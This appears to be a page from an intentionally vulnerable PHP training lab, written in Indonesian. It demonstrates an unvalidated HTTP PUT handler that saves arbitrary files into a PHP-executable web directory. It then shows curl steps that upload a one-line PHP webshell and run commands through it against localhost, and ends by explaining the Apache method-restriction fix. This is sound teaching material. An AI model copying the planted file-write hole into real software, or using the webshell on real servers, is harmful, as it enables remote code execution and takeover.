<?php
$title = 'Lab 14: HTTP Method PUT Diterima Tanpa Validasi';
require_once __DIR__ . '/lib.php';

$upload_dir = __DIR__ . '/data/put_uploads';

// VULNERABLE: request PUT ke file INI SENDIRI diterima dan langsung
// disimpan ke direktori yang bisa diakses & dieksekusi PHP oleh Apache -
// tidak ada validasi ekstensi/isi/tipe konten sama sekali. Bandingkan
// dengan kategori File Upload (A05) yang fokus ke form upload multipart -
// di sini attack surface-nya adalah HTTP method itu sendiri, form upload
// tidak pernah dilibatkan sama sekali.
if ($_SERVER['REQUEST_METHOD'] === 'PUT') {
    if (!is_dir($upload_dir)) mkdir($upload_dir, 0755, true);
    $filename = basename($_GET['file'] ?? ('put_' . time() . '.txt'));
    $body = file_get_contents('php://input');
    file_put_contents($upload_dir . '/' . $filename, $body);
    http_response_code(201);
    header('Content-Type: text/plain');
    echo "Created: $filename (" . strlen($body) . " bytes)\n";
    exit;
}

$db = load_db();
$existing = is_dir($upload_dir) ? array_values(array_diff(scandir($upload_dir), ['.', '..'])) : [];
include 'header.php';
?>

<p>Endpoint ini (file ini sendiri) menerima request dengan HTTP method <code>PUT</code> dan
langsung menyimpan body request apa adanya ke direktori <code>data/put_uploads/</code> — yang
sama-sama berada di webroot dan dieksekusi PHP oleh Apache seperti direktori lain di aplikasi
ini. Tidak ada validasi ekstensi, tipe konten, maupun autentikasi sama sekali.</p>

<h3>1. Buktikan method PUT diterima</h3>
<pre class="result-box">echo "halo dari PUT" > notes.txt
curl -X PUT --data-binary @notes.txt \
  "http://localhost:8079/secmisconfig/lab14_put_method.php?file=notes.txt"
curl http://localhost:8079/secmisconfig/data/put_uploads/notes.txt</pre>
<p class="hint">File yang di-<code>PUT</code> langsung tersimpan dan bisa dibaca balik — bukti
bahwa endpoint ini menerima tulisan file arbitrer tanpa validasi apa pun.</p>

<h3>2. Naikkan ke RCE (webshell lewat PUT)</h3>
<pre class="result-box">printf '&lt;?php system($_GET["cmd"]); ?&gt;' > shell.php
curl -X PUT --data-binary @shell.php \
  "http://localhost:8079/secmisconfig/lab14_put_method.php?file=shell.php"
curl "http://localhost:8079/secmisconfig/data/put_uploads/shell.php?cmd=id"</pre>
<p class="hint">Karena direktori tujuan tetap dieksekusi sebagai PHP oleh Apache (tidak ada
konfigurasi khusus yang mematikannya, berbeda dari <code>uploads_safe/</code> di kategori File
Upload), file <code>.php</code> yang di-<code>PUT</code> langsung berjalan begitu diakses —
Remote Code Execution penuh, tanpa pernah menyentuh form upload aplikasi sama sekali.</p>

<?php if (!empty($existing)): ?>
<h3>File yang sudah pernah di-PUT ke direktori ini</h3>
<ul class="file-list">
  <?php foreach ($existing as $f): ?>
    <li><code><?php echo htmlspecialchars($f); ?></code></li>
  <?php endforeach; ?>
</ul>
<?php endif; ?>

<details class="hint-box">
<summary>Kenapa ini terjadi</summary>
<p class="hint">Banyak developer hanya memikirkan validasi upload di level <em>form aplikasi</em>
(lihat kategori File Upload) dan lupa bahwa web server/handler PHP-nya sendiri bisa menerima
method HTTP lain yang punya efek serupa. <code>&lt;LimitExcept GET POST&gt;...&lt;/LimitExcept&gt;</code>
di konfigurasi Apache seharusnya membatasi method yang diterima per endpoint, tapi ini sering
tidak pernah dipasang karena secara default PHP tetap memproses request PUT/DELETE/dst yang
sampai ke script-nya.</p>
</details>

<?php include 'footer.php'; ?>
